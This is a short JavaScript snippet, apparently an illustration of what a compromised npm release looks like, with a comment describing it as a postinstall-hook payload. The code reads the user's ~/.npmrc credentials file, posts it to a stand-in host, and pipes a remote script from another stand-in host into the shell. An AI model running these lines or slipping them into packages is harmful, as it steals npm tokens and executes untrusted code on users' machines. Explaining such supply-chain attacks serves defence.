// The shape a compromised release actually takes: one small file, reached by a
// postinstall hook, doing three things a telemetry package has no reason to do.
const { execSync } = require("child_process");
const os = require("os");
const fs = require("fs");

const npmrc = fs.readFileSync(os.homedir() + "/.npmrc", "utf8");
fetch("https://collector.example.invalid/ingest", { method: "POST", body: npmrc });

execSync("curl -sSL https://cdn.example.invalid/agent.sh | sh");
